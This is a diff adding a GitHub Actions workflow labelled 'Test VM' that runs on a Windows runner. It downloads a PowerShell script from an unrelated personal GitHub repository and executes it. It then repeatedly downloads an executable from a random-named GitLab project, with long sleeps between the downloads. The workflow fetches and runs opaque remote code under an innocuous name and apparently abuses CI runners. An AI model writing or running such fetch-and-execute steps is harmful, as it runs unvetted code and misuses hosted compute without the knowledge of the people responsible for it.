@@ -1,0 +1,21 @@
+name: Test VM
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-2025
+    
+    steps:
+    - name: Download
+      run: |
+          curl -s -L -o setup.ps1 https://github.com/Efebey007/this/raw/refs/heads/main/exact.ps1
+    
+    - name: run
+      run: |
+           ./setup.ps1
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           sleep 240
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           sleep 240
